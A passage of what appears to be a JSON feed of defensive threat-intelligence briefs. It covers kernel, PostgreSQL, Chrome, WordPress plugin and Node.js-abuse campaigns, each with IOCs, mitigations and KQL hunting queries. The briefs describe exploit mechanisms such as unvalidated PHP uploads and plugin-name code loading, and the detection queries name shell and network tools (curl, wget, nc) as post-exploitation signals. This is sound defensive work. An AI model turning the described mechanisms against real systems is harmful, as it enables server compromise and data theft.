   "Treat a confirmed console compromise as a compromise of every downstream tenant it manages: audit pushed scripts and jobs, remote-control sessions into domain controllers, and agent-deployed tooling per customer, not only on the appliance."
  ],
  "source": "Huntress rapid response \"Critical N-able N-central Vulnerability and Active Exploitation\" (Ben Bernstein and John Hammond, last updated Sep 6, 2026), N-able security advisory for CVE-2026-86218, N-central 2026.3 HF4 release notes, N-able Active Incident page, MSPGeek Discord thread quoted by Huntress",
  "sourceNote": "Aug 1 – Sep 6, 2026"
 },
 "linuxkernelpoc": {
  "eyebrow": "Linux kernel · CVE-2026-52924 (SCTP) · CVE-2026-80714 (IPVS) · NebuSec · Public exploit code",
  "title": "Two local-root exploits published, and a reminder that upstream severity triage is not risk triage",
  "tags": [
   [
    "high",
    "All Sectors"
   ],
   [
    "med",
    "Information Technology"
   ]
  ],
  "overview": "Neither flaw is being exploited in the wild and both need local access, so this is patch-cycle work rather than an incident. The reason to read it now is the SCTP case: upstream first classified the bug as denial of service, and NebuSec's proof of concept shows local privilege escalation on a current Ubuntu kernel. Organisations that filter kernel updates by upstream severity would have deprioritised it. The practical mitigation for SCTP is not the patch at all — most estates have no use for the protocol, and blacklisting the module removes the attack surface on every host at once, which is faster than a fleet-wide kernel rollout. IPVS is different: it is load-balancer plumbing that Kubernetes kube-proxy uses in IPVS mode, so check whether it is in use before assuming it can be unloaded.",
  "technical": [
   "CVE-2026-52924: use-after-free in the kernel SCTP implementation. On a Stale Cookie event the association's stream state is freed via sctp_stream_free() while scheduler dequeue paths (FCFS, RR, PRIO) continue to dereference stream->out_curr->ext. The reported KASAN fault is a slab-use-after-free in sctp_sched_fcfs_dequeue reached through sctp_outq_flush, sctp_do_sm, sctp_assoc_bh_rcv, sctp_inq_push and sctp_rcv; the crash was reported by a researcher credited as Yuqi.",
   "Upstream fix: fully purge the association outqueue when handling the Stale Cookie case, dropping all pending transmit and retransmit state so cached scheduler pointers are invalidated before stream state is rebuilt during COOKIE_WAIT restart. Updating stream->out_curr alone was judged insufficient because queued and retransmit state would still reference freed memory.",
   "Severity divergence: upstream maintainers initially classified the bug as a denial-of-service issue; the reporting carries CVSS 9.8 and NebuSec's published exploit demonstrates local privilege escalation, verified on Ubuntu kernel 7.0.0-28. The upstream code dates to October 2017, so multiple long-term branches are affected.",
   "CVE-2026-80714 (CVSS 9.8): use-after-free in the kernel's IPVS netfilter code. NebuSec published proof-of-concept code and a video showing root privilege escalation on the latest Debian. Fixed across a series of upstream commits (securityonline.info lists 06d1d9b5, acbdc276, 300348e3, 44af98cc and twelve more).",
   "Both require local unprivileged access. Neither has been reported as exploited in the wild, and neither is in CISA KEV as of Sep 6, 2026.",
   "Mitigation available without patching: where SCTP is not required, unloading or blacklisting the sctp module removes the CVE-2026-52924 attack surface. securityonline.info records disabling the protocol module as the stated alternative to updating."
  ],
  "iocs": [],
  "iocNote": "No indicators exist: these are published proof-of-concept exploits from a research team, not observed intrusions. Detection of local kernel exploitation is generic — unexpected privilege transitions, kernel oops or KASAN faults referencing the affected subsystems, and unprivileged processes loading protocol modules — and the durable measurement is kernel version and module state rather than artefacts.",
  "mitigation": [
   "Patch kernels on the affected long-term branches. Treat CVE-2026-52924 on its demonstrated impact (local root) rather than on the initial upstream denial-of-service classification.",
   "Blacklist or unload the sctp module where the protocol is not required — install sctp /bin/false in modprobe configuration — which removes the attack surface without waiting for a kernel rollout.",
   "Before touching IPVS, confirm whether it is in use: Kubernetes kube-proxy in IPVS mode and Linux Virtual Server load balancers depend on it, so unloading is not a universal option for CVE-2026-80714.",
   "Prioritise multi-tenant and shared-shell hosts, CI runners and container hosts where unprivileged local access is expected by design.",
   "Where kernel patching lags, restrict who can create raw or unusual protocol sockets and constrain automatic module loading, since both flaws are reached through protocol handling rather than through a privileged interface."
  ],
  "response": [
   "DEFENDER XDR KQL — with no indicators, the useful output is exposure: which Linux hosts run affected kernels and where the vulnerable modules are actually loaded. Technique adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, LinkedIn @0x534c).\n\n// CVE-2026-52924 / CVE-2026-80714 — kernel exposure and module state\nlet since = datetime(2026-09-01);\nunion isfuzzy=true\n  (DeviceInfo\n   | where Timestamp > since\n   | where OSPlatform has \"Linux\"\n   | summarize arg_max(Timestamp, OSVersion, OSDistribution) by DeviceName\n   | project DeviceName, Leg = \"inventory\", Evidence = strcat(OSDistribution, \" \", OSVersion)),\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where FileName in~ (\"modprobe\",\"insmod\",\"kmod\")\n   | where ProcessCommandLine has_any (\"sctp\",\"ip_vs\",\"ipvs\")\n   | project DeviceName, Leg = \"module load\", Evidence = strcat(AccountName, \": \", ProcessCommandLine)),\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where ProcessCommandLine has_any (\"/proc/net/sctp\",\"ipvsadm\",\"lsmod\")\n   | project DeviceName, Leg = \"protocol use\", Evidence = ProcessCommandLine)\n| summarize Legs = make_set(Leg), Detail = make_set(Evidence, 6) by DeviceName\n| sort by DeviceName asc",
   "SENTINEL KQL — the exploitation-side signal for a local kernel use-after-free is the crash it leaves behind when it fails, plus an unprivileged process gaining root; both are log-side rather than endpoint-side.\n\n// Kernel fault and privilege-transition hunting for the affected subsystems\nlet since = datetime(2026-09-01);\nunion isfuzzy=true\n  (Syslog\n   | where TimeGenerated > since\n   | where SyslogMessage has_any (\"KASAN\",\"slab-use-after-free\",\"general protection fault\",\"BUG: unable to handle\")\n   | where SyslogMessage has_any (\"sctp_\",\"ip_vs\",\"ipvs\")\n   | project TimeGenerated, Host = Computer, Leg = \"kernel fault\", Evidence = SyslogMessage),\n  (Syslog\n   | where TimeGenerated > since\n   | where SyslogMessage has_any (\"session opened for user root\",\"COMMAND=\",\"authentication failure\")\n   | where SyslogMessage has \"root\"\n   | project TimeGenerated, Host = Computer, Leg = \"privilege transition\", Evidence = SyslogMessage)\n| summarize Events = count(), First = min(TimeGenerated), Last = max(TimeGenerated), Detail = make_set(Evidence, 5) by Host, Leg\n| sort by Last desc",
   "A KASAN or general-protection fault naming sctp_sched_fcfs_dequeue or sctp_outq_flush is worth treating as a failed exploitation attempt on an unpatched host, not as a hardware or driver fault."
  ],
  "source": "NebuSec research and proof-of-concept releases, securityonline.info (Sep 3 and Sep 5, 2026), upstream Linux kernel commit notes, Intruder CVE data",
  "sourceNote": "Sep 3 – Sep 6, 2026"
 },
 "postgreshell": {
  "eyebrow": "PostgreSQL · CVE-2026-6471 · PostGREShell · CVSS 7.2 · Patched Aug 13, 2026",
  "title": "The replication credential nobody inventories, and a fix that breaks change data capture",
  "tags": [
   [
    "high",
    "All Sectors"
   ],
   [
    "high",
    "Information Technology"
   ]
  ],
  "overview": "Two things make this worth acting on despite a 7.2 score and no reported exploitation. First, the prerequisite is a credential most organisations do not treat as sensitive: REPLICATION is handed to backup jobs, monitoring agents and CDC pipelines, often shared, often long-lived, and rarely rotated — and it now yields code execution as the database service account plus a persistent, passwordless superuser backdoor. Second, the fix has a compatibility cost that will tempt teams to defer it: the project chose a plugin allow-list, so environments using wal2json, decoderbufs or a proprietary output plugin can find replication slots refusing to initialise after patching. Plan the plugin question before the maintenance window rather than discovering it during one. The 114 malicious PostgreSQL plugins Cyera found on VirusTotal are context for the plugin-loading risk generally, not evidence of exploitation of this CVE.",
  "technical": [
   "CVE-2026-6471 (CVSS 7.2), disclosed by Cyera Research Labs on Sep 1, 2026 and dubbed PostGREShell. Advisory wording: missing authorization in PostgreSQL logical decoding allows a non-superuser holding REPLICATION privilege to dlopen any file visible to the operating system account running the server, via the choice of logical decoding plugin, which in turn runs arbitrary code as that account.",
   "Mechanism: when a tool requests logical decoding it names an output plugin, which PostgreSQL loads and runs with server process privileges. Non-superuser accounts are meant to be confined to an administrator-controlled plugin directory, but Cyera found the plugin name is passed to the loader without validation or sanitisation.",
   "Impact chain per Cyera: a low-privilege backup account reaches remote code execution on Windows, Linux and macOS, escalates to full PostgreSQL superuser, and can install persistent backdoor access including passwordless connections and restored superuser privileges — total database and server compromise.",
   "Affected: every release from PostgreSQL 9.4 (2014) through 18, confirmed by Cyera on 18.2. The vulnerable path exists wherever logical replication, change data capture (for example Debezium), migration tooling or advanced backup solutions are used.",
   "Fixed in PostgreSQL 18.6, 17.11, 16.15, 15.19 and 14.24, released Aug 13, 2026. CVE assigned ahead of an expected May 14, 2026 release; the release carrying the fix published Aug 22 per Cyera's timeline.",
   "Fix design and side effect: the project applied an allow-list of permitted output plugins rather than the standard LOAD restrictions, which would have forced all third-party plugins into $libdir/plugins and was judged too disruptive. A replication user naming a plugin outside the list is rejected with ERROR: library \"...\" may not be used as an output plugin, so third-party CDC plugins such as wal2json and decoderbufs fail to initialise slots until reconfigured. A known issue with pg_createsubscriber was reported as of Sep 4, 2026.",
   "Cyera's VirusTotal hunt found 114 malicious PostgreSQL plugins in the wild — trojans, cryptocurrency miners and reverse shells. The disclosure does not link any of them to exploitation of CVE-2026-6471, and no in-the-wild exploitation has been reported.",
   "Credit: Cyera Research Labs thanks Noah Misch and the PostgreSQL security team for confirming the flaw and coordinating the fix."
  ],
  "iocs": [
   {
    "type": "Behavior",
    "value": "CREATE_REPLICATION_SLOT naming an output plugin that is not part of your standard CDC configuration",
    "note": "Primary exploitation signal; GBHackers records monitoring for unexpected CREATE_REPLICATION_SLOT activity as the recommended detection"
   },
   {
    "type": "String",
    "value": "library \"...\" may not be used as an output plugin",
    "note": "Post-patch server log entry when a replication user names a plugin outside the allow-list — also the artefact a blocked exploit attempt leaves"
   },
   {
    "type": "Behavior",
    "value": "Child process or outbound connection originating from the postgres service account",
    "note": "Code executes as the OS account running the server, so process and network activity under that identity is the post-exploitation signal"
   },
   {
    "type": "Behavior",
    "value": "Outbound SMB (445) or NFS (2049) traffic from a database server",
    "note": "Remote plugin loading path; GBHackers advises blocking unnecessary outbound SMB and NFS from database hosts and disabling unused automount services"
   }
  ],
  "iocNote": "No indicators of compromise have been published — this is coordinated disclosure with no reported exploitation. Everything above is derived from the mechanism and the researchers' remediation guidance, and should be treated as hunting logic rather than as attributed campaign artefacts. Cyera's 114 malicious plugin samples illustrate the broader risk of untrusted database extensions and are not tied to this CVE.",
  "mitigation": [
   "Patch to PostgreSQL 18.6, 17.11, 16.15, 15.19 or 14.24 or later. Confirm managed-service versions too — cloud providers ship their own patch schedules.",
   "Before patching, enumerate which output plugins your replication and CDC tooling names. Third-party plugins such as wal2json and decoderbufs must be reconciled with the new allow-list or slot creation will fail after the update.",
   "Audit every account carrying the REPLICATION attribute and remove it from accounts that do not need it. Treat the remaining ones as privileged credentials: unique per consumer, rotated, and not embedded in shared configuration.",
   "Restrict replication connections to trusted hosts with explicit pg_hba.conf rules rather than relying on network position.",
   "Block unnecessary outbound SMB on port 445 and NFS on port 2049 from database servers and disable unused automount services, closing the remote-file plugin-loading path.",
   "Review the filesystem visible to the database service account for writable directories, and review existing extensions and plugins for provenance."
  ],
  "response": [
   "SENTINEL KQL — the detection that matters is a replication slot created with a plugin you do not use, plus the post-patch rejection message; both live in PostgreSQL server logs rather than in endpoint telemetry. Technique adapted from community work: github.com/Bert-JanP/Hunting-Queries-Detection-Rules (Bert-Jan Pals, kqlquery.com).\n\n// PostGREShell CVE-2026-6471 — replication slot and plugin-load activity\nlet since = datetime(2026-08-01);\nlet knownPlugins = dynamic([\"pgoutput\",\"test_decoding\",\"wal2json\",\"decoderbufs\"]);\nunion isfuzzy=true\n  (Syslog\n   | where TimeGenerated > since\n   | where ProcessName has \"postgres\" or Facility has \"postgres\"\n   | where SyslogMessage has_any (\"CREATE_REPLICATION_SLOT\",\"may not be used as an output plugin\",\"logical decoding\")\n   | project TimeGenerated, Host = Computer, Evidence = SyslogMessage),\n  (Event\n   | where TimeGenerated > since\n   | where Source has \"PostgreSQL\"\n   | where RenderedDescription has_any (\"CREATE_REPLICATION_SLOT\",\"may not be used as an output plugin\")\n   | project TimeGenerated, Host = Computer, Evidence = RenderedDescription)\n| extend Plugin = extract(@\"plugin[= ]+'?([A-Za-z0-9_\\-\\.]+)\", 1, Evidence)\n| extend Verdict = case(\n    Evidence has \"may not be used as an output plugin\", \"blocked by patched allow-list — investigate caller\",\n    isnotempty(Plugin) and Plugin !in (knownPlugins), \"unexpected plugin name — investigate\",\n    \"baseline\")\n| where Verdict != \"baseline\"\n| summarize Events = count(), First = min(TimeGenerated), Last = max(TimeGenerated), Detail = make_set(Evidence, 5) by Host, Plugin, Verdict\n| sort by Last desc",
   "DEFENDER XDR KQL — post-exploitation: the database service account behaving like an interactive account. On a patched estate this should return nothing.\n\n// Code execution under the PostgreSQL service account\nlet since = datetime(2026-08-01);\nunion isfuzzy=true\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName has_any (\"postgres\",\"postgres.exe\",\"pg_ctl.exe\")\n   | where FileName has_any (\"sh\",\"bash\",\"cmd.exe\",\"powershell.exe\",\"curl\",\"wget\",\"python3\",\"nc\")\n   | project Timestamp, DeviceName, Leg = \"child process\", Evidence = strcat(InitiatingProcessFileName, \" -> \", ProcessCommandLine)),\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName has_any (\"postgres\",\"postgres.exe\")\n   | where FileName endswith \".so\" or FileName endswith \".dll\" or FileName endswith \".dylib\"\n   | project Timestamp, DeviceName, Leg = \"library write\", Evidence = strcat(ActionType, \" \", FolderPath, FileName)),\n  (DeviceNetworkEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName has_any (\"postgres\",\"postgres.exe\")\n   | where RemotePort in (445, 2049) or RemoteIPType == \"Public\"\n   | project Timestamp, DeviceName, Leg = \"egress\", Evidence = strcat(RemoteIP, \":\", RemotePort, \" \", RemoteUrl))\n| summarize Legs = make_set(Leg), Events = count(), Detail = make_set(Evidence, 8) by DeviceName\n| sort by Events desc",
   "Where a slot was created with an unexpected plugin, collect the shared library it named before rotating credentials — it is the payload, and the loader path is the only place it is recorded.",
   "Treat a confirmed exploitation as a superuser compromise of the instance: review roles for restored superuser attributes and passwordless authentication entries, not only for the account that was used."
  ],
  "source": "Cyera Research Labs (PostGREShell disclosure, Sep 1, 2026), SecurityWeek, Security Affairs, CSO Online, GBHackers, SC Media, PostgreSQL security release notes",
  "sourceNote": "Aug 13 – Sep 5, 2026"
 },
 "chromev8": {
  "eyebrow": "Google Chrome · CVE-2026-85046 · V8 type confusion · Exploited in the wild · Patched Sep 3, 2026",
  "title": "A browser zero-day with nothing to hunt for and one control that works",
  "tags": [
   [
    "crit",
    "All Sectors"
   ],
   [
    "high",
    "Information Technology"
   ]
  ],
  "overview": "Google restricts detail on exploited Chrome bugs until most users have updated, so there is no exploitation narrative, no targeting information and no indicator set to work from — and there will not be one for weeks. That leaves browser version state as the entire defensive position. Two things make it worth a deliberate pass rather than trusting auto-update: the Android build reaches Google Play over several days and desktop automatic updates roll out over days to weeks, so a fleet is not patched when the release notes say it is; and every Chromium-derived browser in the estate inherits the same V8 defect and needs its own vendor release, which for Edge, Opera and Brave arrives later than Chrome's. Treat managed browser inventory, not KEV, as the measurement here — the KEV entry adds an obligation, not information.",
  "technical": [
   "CVE-2026-85046: type confusion in the V8 JavaScript engine, rated high severity by Google. Reported by external researcher Salvatore Gulizia.",
   "Impact per Google's advisory wording and Forbes's reporting: a remote attacker can execute arbitrary code inside the browser's security sandbox through a maliciously crafted web page. A sandbox escape would be a separate defect; nothing published states whether one was chained in the observed exploitation.",
   "Fixed versions: 152.0.7977.82/.83 for Windows and Mac, 152.0.7977.82 for Linux and Android, released Sep 3, 2026 by Chrome's Srinivas Sista. Eleven other security fixes shipped in the same release.",
   "Google states it is aware of reports that an exploit for CVE-2026-85046 exists in the wild, and withholds bug detail and links until a majority of users are updated.",
   "CISA added the CVE to the KEV catalog on Sep 4, 2026, which brings a BOD 26-04 remediation obligation for federal civilian agencies.",
   "Downstream exposure: Chromium-based browsers including Microsoft Edge, Opera and Brave carry the same V8 code and require their own vendor updates.",
   "No CVSS score was published in the sources reviewed; Google's own severity rating is high."
  ],
  "iocs": [],
  "iocNote": "No indicators have been published and none should be expected soon. Google's disclosure policy holds technical detail on exploited Chrome bugs until the majority of users have updated, and no vendor has published campaign infrastructure, delivery domains or victim detail. Hunt on version state, not artefacts.",
  "mitigation": [
   "Update Chrome to 152.0.7977.82/.83 on Windows and Mac and 152.0.7977.82 on Linux and Android. Relaunch is required — a downloaded update that has not restarted the browser is not applied.",
   "Force the update rather than waiting for the staged rollout. Automatic updates reach other platforms over the following days and weeks and the Android build arrives through Google Play over several days.",
   "Inventory Chromium-derived browsers separately and track their vendor releases. Edge, Opera and Brave inherit the V8 defect and patch on their own schedules.",
   "Where site isolation and the renderer sandbox have been relaxed by policy, review that configuration. Renderer-level code execution is the demonstrated impact.",
   "For high-risk users, treat this as a reason to review browser hardening policy rather than as a single patch event; V8 type confusion has been a recurring exploited class."
  ],
  "response": [
   "DEFENDER XDR KQL — the only reliable measurement here is version state across the fleet, including the Chromium derivatives that inherit the defect. Enrichment technique adapted from community work: github.com/Bert-JanP/Hunting-Queries-Detection-Rules (Bert-Jan Pals, kqlquery.com).\n\n// CVE-2026-85046 — Chrome and Chromium-derivative version exposure\nlet fixed = \"152.0.7977.82\";\nDeviceTvmSoftwareInventory\n| where SoftwareName has_any (\"chrome\", \"microsoft edge\", \"opera\", \"brave\")\n| extend Ver = SoftwareVersion\n| extend Major = toint(split(Ver, \".\")[0])\n| summarize Devices = dcount(DeviceName), Sample = make_set(DeviceName, 5)\n    by SoftwareVendor, SoftwareName, Ver, Major\n| extend ChromeExposed = iff(SoftwareName has \"chrome\" and Ver != fixed and Major <= 152, \"review\", \"\")\n| sort by Devices desc",
   "DEFENDER XDR KQL — post-exploitation shape if a renderer compromise was chained: the browser process spawning script interpreters or writing executables. This is generic browser-exploitation hunting, not detection of this CVE.\n\n// Renderer-to-host activity following browser code execution\nlet browsers = dynamic([\"chrome.exe\",\"msedge.exe\",\"opera.exe\",\"brave.exe\"]);\nlet since = datetime(2026-08-25);\nunion isfuzzy=true\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName has_any (browsers)\n   | where FileName has_any (\"powershell.exe\",\"cmd.exe\",\"wscript.exe\",\"cscript.exe\",\"mshta.exe\",\"rundll32.exe\",\"node.exe\")\n   | project Timestamp, DeviceName, AccountName, Evidence = strcat(InitiatingProcessFileName, \" -> \", FileName, \" \", ProcessCommandLine)),\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName has_any (browsers)\n   | where FileName endswith \".exe\" or FileName endswith \".dll\" or FileName endswith \".scr\"\n   | where not(FolderPath has \"\\\\Downloads\\\\\")\n   | project Timestamp, DeviceName, AccountName, Evidence = strcat(ActionType, \" \", FolderPath, FileName))\n| sort by Timestamp desc",
   "Report on relaunch-pending state, not installed version. Chrome applies the fix only after restart, and long-lived sessions are common on the users most likely to be targeted."
  ],
  "source": "Google Chrome release advisory (Sep 3, 2026), Forbes, CISA KEV catalog, securityonline.info",
  "sourceNote": "Sep 3 – Sep 5, 2026"
 },
 "superforms": {
  "eyebrow": "Super Forms CVE-2026-14894 · Elementor Pro CVE-2026-32475 · 440,000+ blocked attempts · Wordfence",
  "title": "Two unauthenticated upload flaws being exploited at scale, eight weeks after the patches",
  "tags": [
   [
    "crit",
    "Commercial Facilities"
   ],
   [
    "high",
    "Information Technology"
   ]
  ],
  "overview": "Neither flaw is new and both are fixed; what is new is the volume and the timing. Wordfence's numbers show the pattern that makes plugin file-upload bugs reliable for opportunistic operators: the Super Forms fix shipped Jul 8, disclosure followed on Jul 9, exploitation started Jul 14 on the day the paid firewall rule went out, free customers waited until Aug 13, and the heaviest activity ran Aug 18–25 — a month in which the exploit was public and a large share of sites had neither the patch nor a rule. The end state is an ordinary PHP web shell, so the useful hunt is filesystem-side and log-side rather than plugin-version-side: an unexpected .php file under the uploads tree is the artefact, and for Elementor Pro the write path is specific enough to check directly. Published source addresses are worth blocking but are the disposable part of the operation.",
  "technical": [
   "CVE-2026-14894 (CVSS 9.8): missing file-type validation in Super Forms – Drag & Drop Form Builder through 6.3.313. The submit_form() routine processes file-upload fields reaching the unauthenticated super_submit_form AJAX handler, base64-decodes a supplied data URI ('data' parameter, datauristring/value) and writes it to disk without validating type, permitting executable PHP. Wordfence notes the flaw may also support path traversal, placing files outside the expected upload path. Fixed in 6.3.314, released Jul 8, 2026; disclosed Jul 9, 2026. Reported by Wordfence researcher Andrea Bocchetti. Estimated 13,000 active installations.",
   "CVE-2026-32475 (scored 9.0 by some sources and 9.8 by others): unauthenticated arbitrary file upload in Elementor Pro, fixed in 4.2.2. Per Wordfence, the uploaded PHP file is written to /wp-content/uploads/elementor/forms/ under a randomly generated filename with the attacker-supplied .php extension and can be requested directly to execute arbitrary commands.",
   "Exploitation timeline for Super Forms per Wordfence: attacks began Jul 14, 2026, the same day the firewall rule reached Premium, Care and Response customers; free users received the rule Aug 13; the most intense activity occurred Aug 18–25. More than 250,000 attempts blocked against this CVE alone.",
   "Exploitation of the Elementor Pro flaw commenced Aug 19, 2026. The Hacker News puts the combined blocked total for both CVEs above 440,000 attempts.",
   "Top source addresses reported by Wordfence for the Super Forms campaign: 103.168.147.235 with more than 106,000 blocked requests, and 103.168.146.131.",
   "Post-exploitation as described by Wordfence and Cyberpress: a PHP web shell yielding persistent access, additional malware, phishing kits or spam infrastructure, rogue administrator accounts, data theft, and overwriting of any file writable by the web server.",
   "Patchstack rates the Super Forms flaw as the profile used in mass-exploitation campaigns against thousands of sites regardless of traffic or popularity, and has issued a virtual-patching rule."
  ],
  "iocs": [
   {
    "type": "IP",
    "value": "103.168.147.235",
    "note": "Top source of Super Forms CVE-2026-14894 exploitation per Wordfence; 106,000+ blocked requests"
   },
   {
    "type": "IP",
    "value": "103.168.146.131",
    "note": "Second-ranked source address in the same Wordfence campaign data"
   },
   {
    "type": "Filename",
    "value": "/wp-content/uploads/elementor/forms/*.php",
    "note": "Elementor Pro CVE-2026-32475 web shell write path — randomly generated name, attacker-supplied .php extension"
   },
   {
    "type": "String",
    "value": "super_submit_form",
    "note": "Unauthenticated AJAX action carrying the Super Forms upload; look for admin-ajax.php requests with this action and a data URI payload"
   },
   {
    "type": "String",
    "value": "datauristring",
    "note": "Parameter value form carrying the base64-encoded file in the Super Forms exploit path"
   },
   {
    "type": "Behavior",
    "value": "New or modified .php file under wp-content/uploads written by the web server process",
    "note": "Common end state for both CVEs; Wordfence advises auditing for unexpected or recently modified .php files"
   }
  ],
  "iocNote": "The addresses above are Wordfence's top blocked sources for the Super Forms campaign, published as volume data rather than as attributed actor infrastructure; the Elementor Pro article lists further addresses that were not enumerated in the coverage reviewed. No hashes were published — the payloads are attacker-supplied web shells with randomised filenames, so the file path and the writing process are the durable signals.",
  "mitigation": [
   "Update Super Forms to 6.3.314 or later and Elementor Pro to 4.2.2 or later. Both fixes have been available since July.",
   "Audit wp-content/uploads for .php files and for recently modified PHP anywhere in the webroot. Check /wp-content/uploads/elementor/forms/ specifically — a .php file there is not a legitimate artefact.",
   "Review administrator accounts and application passwords created since mid-July, and rotate WordPress, database and hosting credentials on any site where a shell is found.",
   "Block or rate-limit unauthenticated admin-ajax.php actions that accept file content where the plugin is not needed, and disable unused form plugins rather than leaving them installed and inactive.",
   "Treat the published source addresses as a short-lived control. Blocking 103.168.147.235 and 103.168.146.131 removes the loudest traffic but not the campaign."
  ],
  "response": [
   "DEFENDER XDR KQL — the reliable host-side signal is the web server process writing PHP under the uploads tree, then executing shell commands. Technique adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, LinkedIn @0x534c).\n\n// CVE-2026-14894 / CVE-2026-32475 — web shell write and use\nlet webProcs = dynamic([\"php-fpm\",\"php\",\"httpd\",\"apache2\",\"nginx\",\"w3wp.exe\"]);\nlet since = datetime(2026-07-08);\nunion isfuzzy=true\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName has_any (webProcs)\n   | where FileName endswith \".php\"\n   | where FolderPath has \"wp-content\" and FolderPath has \"uploads\"\n   | project Timestamp, DeviceName, Evidence = strcat(ActionType, \" \", FolderPath, FileName)),\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName has_any (webProcs)\n   | where FileName has_any (\"sh\",\"bash\",\"cmd.exe\",\"powershell.exe\",\"curl\",\"wget\",\"python3\",\"whoami\")\n   | project Timestamp, DeviceName, Evidence = strcat(InitiatingProcessFileName, \" -> \", FileName, \" \", ProcessCommandLine))\n| sort by Timestamp desc",
   "SENTINEL KQL — the request side: unauthenticated upload attempts on both plugins, with the published source addresses called out and success separated from attempts by status code.\n\n// Super Forms and Elementor Pro upload exploitation in web logs\nlet since = datetime(2026-07-08);\nlet badIPs = dynamic([\"103.168.147.235\",\"103.168.146.131\"]);\nunion isfuzzy=true\n  (W3CIISLog\n   | where TimeGenerated > since\n   | where csUriStem has \"admin-ajax.php\" and csUriQuery has_any (\"super_submit_form\",\"datauristring\")\n   | project TimeGenerated, Site = sSitename, Src = cIP, Uri = strcat(csUriStem, \"?\", csUriQuery), Status = scStatus, Verb = csMethod),\n  (W3CIISLog\n   | where TimeGenerated > since\n   | where csUriStem has \"/wp-content/uploads/elementor/forms/\" and csUriStem endswith \".php\"\n   | project TimeGenerated, Site = sSitename, Src = cIP, Uri = csUriStem, Status = scStatus, Verb = csMethod)\n| extend KnownSource = iff(Src in (badIPs), \"Wordfence-reported\", \"\")\n| extend Outcome = iff(Status < 400, \"served\", \"blocked-or-error\")\n| summarize Requests = count(), First = min(TimeGenerated), Last = max(TimeGenerated)\n    by Site, Src, KnownSource, Uri, Verb, Outcome\n| sort by Requests desc",
   "A request that returned 200 for a .php path under /wp-content/uploads/elementor/forms/ is a shell execution, not an attempt. Treat those hosts as compromised and go to file review rather than to patch state.",
   "Correlate the upload timestamp with administrator-account creation in the WordPress user table. Wordfence describes rogue admin creation as the usual follow-on, and it outlasts removal of the shell."
  ],
  "source": "Wordfence threat intelligence and firewall telemetry, The Hacker News, GBHackers, Cyberpress, securityonline.info, Patchstack database",
  "sourceNote": "Jul 8 – Sep 5, 2026"
 },
 "nodeabuse": {
  "eyebrow": "Node.js runtime abuse · Woodgnat / KongTuke · Symantec Threat Hunter Team · Active since Feb 2026",
  "title": "When payload delivery kept failing, the attackers installed a signed runtime instead",
  "tags": [
   [
    "high",
    "Government Facilities"
   ],
   [
    "high",
    "Information Technology"
   ]
  ],
  "overview": "The detail worth taking from Symantec's report is the decision point: in the Asian technology start-up intrusion the attackers' AdaptixC2 and Cobalt Strike payloads were being blocked, and their answer was to download the vendor's own Node.js installer and run their implant as interpreted JavaScript under a signed, ubiquitous binary. That moves the malicious logic out of files that signatures and allow-lists inspect and into script arguments, and it makes the parent-child chain look like development work. Two consequences for detection: node.exe on a host with no development role is itself the anomaly, so software inventory is a hunting input rather than an asset record; and the C2 leg reaches Ethereum gateways, which are ordinary web endpoints that no reputation list treats as malicious. Woodgnat's ransomware associations mean this tradecraft is a precursor to encryption events, not an espionage curiosity.",
  "technical": [
   "Reported by the Symantec Threat Hunter Team on Sep 3, 2026: revived abuse of Node.js since February 2026 against government departments, technology companies and hotels.",
   "Asian technology start-up, March to July 2026: ClickFix social engineering for initial access, followed by suspicious PowerShell activity; repeated attempts to deploy AdaptixC2 agents and Cobalt Strike Beacon were blocked on the network. The attackers then downloaded the official Node.js installer from nodejs.org and used the signed node.exe runtime to execute a malicious implant.",
   "The implant maintained access for months and made repeated connections to Ethereum blockchain gateways, an EtherHiding-style channel Symantec assesses was most likely used to retrieve commands or additional payloads.",
   "Persistence: a Windows service-launched PowerShell downloader plus a registry Run key entry that relaunched node.exe at login. Symantec reports the persistent PowerShell downloaded a further AdaptixC2 binary.",
   "Infrastructure detail published: domain spoofing of a company called Devmine, with 'datalyerservice' used as a command-and-control server.",
   "Evasion rationale per Symantec: because malicious code lives in interpreted scripts rather than binaries, signature-based detection and binary allow-listing are less effective against it.",
   "Attribution and linkage: some attacks used ModeloRAT and Backdoor.Mistic (MLTBackdoor), assessed as the work of initial access broker Woodgnat (aka KongTuke), publicly linked to intrusions involving Qilin, Interlock, Rhysida, Akira, 8Base, Black Basta and Embargo ransomware.",
   "Symantec's June 2026 reporting on Woodgnat described node.exe abuse chained with PowerShell and Windows command-line tools, a malicious Chrome extension named NexShield, a ClickFix variant dubbed CrashFix, and a .NET payload named GateKeeper with layered encryption and victim-fingerprinting logic.",
   "US fintech organisation: same modus operandi, earliest observed activity May 6, 2026 with an AdaptixC2 agent and Cobalt Strike Beacon deployed from a ClickFix foothold, later leading to C2Looper, a Rust-based backdoor documented by Zscaler ThreatLabz.",
   "Related campaign volume: GuidePoint Security reports at least 31 organisations compromised through a ClickFix campaign serving fake CAPTCHA prompts on compromised sites, across e-commerce, professional services and retail logistics."
  ],
  "iocs": [
   {
    "type": "String",
    "value": "datalyerservice",
    "note": "Command-and-control server name published by Symantec for the Asian technology start-up intrusion"
   },
   {
    "type": "Actor Alias",
    "value": "Woodgnat / KongTuke",
    "note": "Initial access broker Symantec links to ModeloRAT and Backdoor.Mistic, and publicly associated with Qilin, Interlock, Rhysida, Akira, 8Base, Black Basta and Embargo"
   },
   {
    "type": "Behavior",
    "value": "node.exe executing a script from a user-writable path on a host with no development role",
    "note": "Core technique: signed runtime interpreting the attacker's JavaScript implant"
   },
   {
    "type": "Behavior",
    "value": "Registry Run key entry relaunching node.exe at login",
    "note": "Persistence observed alongside a Windows service-launched PowerShell downloader"
   },
   {
    "type": "Behavior",
    "value": "Repeated outbound connections from node.exe to Ethereum blockchain gateway endpoints",
    "note": "EtherHiding-style command and payload retrieval; the endpoints are legitimate infrastructure"
